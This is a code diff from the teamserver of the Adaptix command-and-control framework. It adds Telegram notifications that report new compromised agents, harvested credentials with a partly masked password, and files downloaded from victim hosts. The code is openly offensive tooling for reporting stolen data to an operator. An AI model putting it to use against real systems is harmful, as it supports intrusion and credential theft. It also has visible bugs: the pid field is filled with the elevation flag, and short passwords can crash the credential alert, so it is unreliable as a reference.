@@ -1,14 +1,16 @@
 package server
 
 import (
+	"AdaptixServer/core/utils/tformat"
 	"bytes"
 	"encoding/json"
 	"fmt"
-	adaptix "github.com/Adaptix-Framework/axc2"
 	"io"
 	"net/http"
 	"strings"
 	"time"
+
+	adaptix "github.com/Adaptix-Framework/axc2"
 )
 
 func (ts *Teamserver) TsEventClient(connected bool, username string) {
@@ -67,21 +69,8 @@ func (ts *Teamserver) TsEventAgent(restore bool, agentData adaptix.AgentData) {
 	ts.TsSyncAllClients(packet)
 	ts.events.Put(packet)
 
-	if !restore && ts.Profile.Callbacks.Telegram.Token != "" && ts.Profile.Callbacks.Telegram.ChatsId != nil && ts.Profile.Callbacks.NewAgentMessage != "" {
-		msg := ts.Profile.Callbacks.NewAgentMessage
-		msg = strings.ReplaceAll(msg, "%type%", agentData.Name)
-		msg = strings.ReplaceAll(msg, "%id%", agentData.Id)
-		msg = strings.ReplaceAll(msg, "%user%", agentData.Username)
-		msg = strings.ReplaceAll(msg, "%computer%", agentData.Computer)
-		msg = strings.ReplaceAll(msg, "%externalip%", agentData.ExternalIP)
-		msg = strings.ReplaceAll(msg, "%internalip%", agentData.InternalIP)
-		msg = strings.ReplaceAll(msg, "%domain%", agentData.Domain)
-		msg = strings.ReplaceAll(msg, "%elevated%", fmt.Sprintf("%v", agentData.Elevated))
-		msg = strings.ReplaceAll(msg, "%pid%", fmt.Sprintf("%v", agentData.Elevated))
-
-		for _, chatId := range ts.Profile.Callbacks.Telegram.ChatsId {
-			SendTelegram(msg, ts.Profile.Callbacks.Telegram.Token, chatId)
-		}
+	if !restore {
+		go ts.TsEventCallbackAgent(agentData)
 	}
 }
 
@@ -132,6 +121,71 @@ func (ts *Teamserver) TsEventTunnelRemove(tunnel *Tunnel) {
 		ts.events.Put(packet)
 	}
 }
+
+/// CALLBACKS
+
+func (ts *Teamserver) TsEventCallbackAgent(agentData adaptix.AgentData) {
+	if ts.Profile.Callbacks.Telegram.Token != "" && ts.Profile.Callbacks.Telegram.ChatsId != nil && ts.Profile.Callbacks.NewAgentMessage != "" {
+		msg := ts.Profile.Callbacks.NewAgentMessage
+		msg = strings.ReplaceAll(msg, "%type%", agentData.Name)
+		msg = strings.ReplaceAll(msg, "%id%", agentData.Id)
+		msg = strings.ReplaceAll(msg, "%user%", agentData.Username)
+		msg = strings.ReplaceAll(msg, "%computer%", agentData.Computer)
+		msg = strings.ReplaceAll(msg, "%externalip%", agentData.ExternalIP)
+		msg = strings.ReplaceAll(msg, "%internalip%", agentData.InternalIP)
+		msg = strings.ReplaceAll(msg, "%domain%", agentData.Domain)
+		msg = strings.ReplaceAll(msg, "%elevated%", fmt.Sprintf("%v", agentData.Elevated))
+		msg = strings.ReplaceAll(msg, "%pid%", fmt.Sprintf("%v", agentData.Elevated))
+
+		for _, chatId := range ts.Profile.Callbacks.Telegram.ChatsId {
+			SendTelegram(msg, ts.Profile.Callbacks.Telegram.Token, chatId)
+		}
+	}
+}
+
+func (ts *Teamserver) TsEventCallbackCreds(creds []adaptix.CredsData) {
+	if ts.Profile.Callbacks.Telegram.Token != "" && ts.Profile.Callbacks.Telegram.ChatsId != nil && ts.Profile.Callbacks.NewCredMessage != "" {
+
+		if len(creds) > 4 {
+			msg := fmt.Sprintf("Added %d new credentials", len(creds))
+			for _, chatId := range ts.Profile.Callbacks.Telegram.ChatsId {
+				SendTelegram(msg, ts.Profile.Callbacks.Telegram.Token, chatId)
+			}
+		} else {
+			for _, credData := range creds {
+				secret := credData.Password[:3] + "*****"
+
+				msg := ts.Profile.Callbacks.NewCredMessage
+				msg = strings.ReplaceAll(msg, "%username%", credData.Username)
+				msg = strings.ReplaceAll(msg, "%password%", secret)
+				msg = strings.ReplaceAll(msg, "%domain%", credData.Realm)
+				msg = strings.ReplaceAll(msg, "%type%", credData.Type)
+				msg = strings.ReplaceAll(msg, "%storage%", credData.Storage)
+				msg = strings.ReplaceAll(msg, "%host%", credData.Host)
+
+				for _, chatId := range ts.Profile.Callbacks.Telegram.ChatsId {
+					SendTelegram(msg, ts.Profile.Callbacks.Telegram.Token, chatId)
+				}
+			}
+		}
+	}
+}
+
+func (ts *Teamserver) TsEventCallbackDownloads(downloadData adaptix.DownloadData) {
+	if ts.Profile.Callbacks.Telegram.Token != "" && ts.Profile.Callbacks.Telegram.ChatsId != nil && ts.Profile.Callbacks.NewDownloadMessage != "" {
+		msg := ts.Profile.Callbacks.NewDownloadMessage
+		msg = strings.ReplaceAll(msg, "%user%", downloadData.User)
+		msg = strings.ReplaceAll(msg, "%computer%", downloadData.Computer)
+		msg = strings.ReplaceAll(msg, "%path%", downloadData.RemotePath)
+		msg = strings.ReplaceAll(msg, "%size%", tformat.SizeBytesToFormat(uint64(downloadData.TotalSize)))
+
+		for _, chatId := range ts.Profile.Callbacks.Telegram.ChatsId {
+			SendTelegram(msg, ts.Profile.Callbacks.Telegram.Token, chatId)
+		}
+	}
+}
+
+///
 
 func SendTelegram(text, botToken, chatID string) {
 	go func() {
